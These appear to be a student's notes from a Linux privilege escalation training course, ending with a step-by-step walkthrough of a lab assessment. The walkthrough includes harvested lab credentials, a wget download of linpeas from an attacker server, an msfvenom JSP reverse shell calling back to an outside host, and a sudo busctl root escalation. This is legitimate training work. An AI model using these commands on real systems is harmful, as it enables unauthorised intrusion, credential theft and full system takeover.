	-> It can be used by internal teams such as system administrators as well as third-parties (auditors and penetration testers) to obtain a "baseline" of the system's current security configuration. 
	
	-> Again, this tool or others like it should not replace the manual techniques discussed in this module but can be a strong supplement to cover areas that may be overlooked.

- After cloning the entire repo, we can run the tool by typing `./lynis audit system` and receive a full report.

htb_student@NIX02:~$ ./lynis audit system

The resulting scan will be broken down into warnings, suggestions and overall scan details section.

## Conclusion
- As we have seen, there are various ways to escalate privileges on Linux/Unix systems - from simple misconfigurations and public exploits for known vulnerable services to exploit development based on custom libraries.
 
	-> Once root access is obtained, it becomes easier to use it as a pivot point for further network exploitation. Linux (and all system) hardening is critical for organizations of all sizes. 
	
	-> Best practice guidelines and controls exist in many different forms. 
	
	-> Reviews should include a mix of hands-on manual testing and review and automated configuration scanning and validation of the results.
```

## Skills assessment
```
# Linux Local Privilege Escalation - Skills Assessment
We have been contracted to perform a security hardening assessment against one of the `INLANEFREIGHT` organizations' public-facing web servers.

The client has provided us with a low privileged user to assess the security of the server. Connect via SSH and begin looking for misconfigurations and other flaws that may escalate privileges using the skills learned throughout this module.

Once on the host, we must find `five` flags on the host, accessible at various privilege levels. Escalate privileges all the way from the `htb-student` user to the `root` user and submit all five flags to finish this module.

ssh htb-student@10.129.60.134
Academy_LLPE!

- First enumerate the hosts (ref to ## environment enumeration)
- cat /etc/os-release

- First flag
	->  Environment enumeration: finding hidden files
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student

- Second flag:
	-> Service internals enumeration: Found barry history file readable 

find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

cat /home/barry/.bash_history

	-> sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local  
	-> credentials: barry_adm:i_l0ve_s3cur1ty!

su barry (with i_l0ve_s3cur1ty!) worked. 

	-> flag2.txt obtained.

- Third flag: 
	-> adm permission, reading log files (ref to ## Special permissions) 
barry@nix03:~$ id
uid=1001(barry) gid=1001(barry) groups=1001(barry),4(adm)

cd /var/log
cat flag3.txt

- Fourth flag:
	-> running linpeas and examine results:

python -m http.server

wget http://10.10.16.6:8000/linpeas.sh
chmod +x linpeas.sh

-rw-r----- 1 root tomcat 2232 Sep  5  2020 /etc/tomcat9/tomcat-users.xml                                             
-rw-r--r-- 1 root root 2161 Sep  5  2020 /usr/share/tomcat9/etc/tomcat-users.xml                                     
<user username="admin" password="admin" roles="admin,manager-gui,manager-script,admin-gui"/>  

	-> tomcat credentials seem interesting

- internal service enumeration:
netstat -tunlp

	-> saw port 8008 open, taking a look at it:
	-> Found tomcat page but does not seem to have the credentials to access it. 
	-> admin:admin doesn't login, taking a look at the tomcat directory.
		-> see a .bak file that adm user can read. 
		-> or we can just look for passwords in various directory, including /etc , /home, /log ...

cd /etc
grep -rnwl -e 'password' 2>/dev/null 
	-> yields tomcat9/tomcat-users.xml.bak 

cat tomcat9/tomcat-users.xml.bak 
	-> <user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>

	-> obtain credentials tomcatadm:T0mc@t_s3cret_p@ss!

	-> logging into manager app as tomcat and obtaining a reverse shell:
		msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.6 LPORT=4444 -f war > backup.war

		upload to manager app

		msfconsole -q
		use multi/handler
		set lhost 10.10.16.6
		set payload java/jsp_shell_reverse_tcp
		run

		cat flag4.txt

	-> got shell, optimising it 
		whoami
			-> tomcat
			
		-> spawning an interactive shell
		python3 -c 'import pty; pty.spawn("/bin/sh")' 

		sudo -l -> (root) NOPASSWD: /usr/bin/busctl
		from gtfo bins -> 

sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'

	-> got root.
```
